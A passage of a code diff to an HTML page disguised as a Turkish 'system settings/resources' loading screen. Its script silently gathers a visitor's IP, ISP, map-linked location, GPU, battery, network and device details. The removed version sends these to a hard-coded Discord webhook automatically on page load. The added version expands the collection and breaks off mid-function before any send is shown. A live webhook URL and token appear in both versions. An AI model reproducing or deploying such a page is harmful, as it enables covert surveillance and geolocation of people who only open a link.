@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Ayarları</title>
+    <title>Sistem Kaynakları</title>
     <style>
         body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
-        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: s 1s linear infinite; }
+        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: s 1s linear infinite; }
         @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -14,71 +14,45 @@
     <div class="l"></div>
 
     <script>
-        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        const webhook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function kusursuzSizdir() {
-            let d = { gpu: "Gizli/Null", ven: "Gizli/Null", ip: "X", iss: "X", loc: "X", net: "X", sys: "X", ext: "X", bat: "X" };
+        async function ultraDataExtract() {
+            // Boş değer korumalı başlangıç setupları
+            let d = { 
+                gpu: "Maskelenmiş/Kısıtlı", ven: "Maskelenmiş/Kısıtlı", 
+                ip: "Alınamadı", iss: "Bilinmiyor", loc: "Bilinmiyor", 
+                net: "Bilinmiyor", bat: "Bilinmiyor", 
+                os: navigator.userAgent.split('(')[1].split(')')[0], // Manuel OS parsing
+                res: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+                lang: navigator.language || "Bilinmiyor",
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "Bilinmiyor"
+            };
 
-            // 1. ZORLANMIŞ GPU & VENDOR (Derin Sorgu)
+            // 1. GPU Zorlama (Agresif Mod)
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"}) || canvas.getContext('webgl');
+                const gl = canvas.getContext('webgl2', {antialias:false, alpha:false}) || canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                 if (dbg) {
-                    d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                    d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                    d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID) || "Gizli";
+                    d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID) || "Gizli";
                 }
             } catch(e) {}
 
-            // 2. ISS, IP, ZAMAN, DİL, KONUM (Hatasız Script)
+            // 2. Ağ & Konum & ISS (Yedekli Yapı)
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const j = await res.json();
-                d.ip = j.ip;
-                d.iss = `${j.org} (AS${j.asn})`;
-                d.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${d.iss}\`\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
-            } catch(e) { d.loc = "Lokasyon Servisi Engellendi"; }
+                d.ip = j.ip || "X";
+                d.iss = `${j.org || 'Bilinmiyor'} (${j.asn || 'N/A'})`;
+                d.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${d.iss}\`\n🗺️ [Haritada Gör](http://www.google.com/maps/place/${j.latitude},${j.longitude})`;
+            } catch(e) {}
 
-            // 3. İNTERNET ANALİZİ
+            // 3. Pil & İnternet Hızı
             try {
+                if(navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    d.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
+                }
                 const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                d.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Tip:** ${n.effectiveType}` : "N/A";
-            } catch(e) {}
-
-            // 4. DONANIM, OS, EKRAN, PİL
-            try {
-                const bat = await navigator.getBattery();
-                d.bat = `%${Math.round(bat.level * 100)} (${bat.charging ? 'Şarjda' : 'Pilde'})`;
-            } catch(e) {}
-
-            d.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n🔋 **Güç:** ${d.bat}`;
-            d.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
-
-            // 5. KUSURSUZ EMBED (KIRMIZI ŞABLON)
-            const payload = {
-                embeds: [{
-                    title: "💀 KUSURSUZ ADLİ ANALİZ (SESSİZ)",
-                    color: 15158332,
-                    fields: [
-                        { name: "📡 AĞ VE ISS KATMANI", value: `${d.loc}\n${d.net}\n**IP:** \`${d.ip}\``, inline: false },
-                        { name: "🛠️ EKRAN KARTI (ZORLANMIŞ)", value: `**Renderer:** \`${d.gpu}\`\n**Vendor:** \`${d.ven}\``, inline: false },
-                        { name: "⚙️ DONANIM DETAYLARI", value: d.sys, inline: false },
-                        { name: "🌐 SİSTEM DETAYLARI", value: d.ext, inline: false },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
-                    ],
-                    footer: { text: "Protocol: Omniscience v9.0" },
-                    timestamp: new Date()
-                }]
-            };
-
-            const blob = JSON.stringify(payload);
-            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
-            navigator.sendBeacon(u, blob);
-        }
-
-        // HİÇBİR ŞEYE BASMADAN OTOMATİK ÇALIŞTIR
-        window.onload = kusursuzSizdir;
-    </script>
-</body>
-</html>
-
+                
